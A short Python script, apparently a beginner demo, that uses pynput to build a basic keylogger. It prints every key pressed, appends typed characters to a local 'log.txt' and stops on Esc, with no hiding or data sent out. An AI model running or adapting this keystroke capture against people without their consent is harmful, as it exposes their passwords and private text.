import pynput

from pynput.keyboard import Key,Listener


def on_press(key):

    try:
        print("Key {} pressed".format(
            key))

        write_files(key)

    except AttributeError:
        print("special key {} pressed".format(
            key))


def write_files(key):

    with open("log.txt","a") as file:

        k = str(key).replace("'","")

        if k.find("space") > 0:
            file.write("\n")

        elif k.find("Key") == -1:
            file.write(k)



def on_release(key):

    print(f"{key} released")

    if key == Key.esc:
        #press the esc key stop listener
        print("Exit....")
        return False


#collect events until released
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()


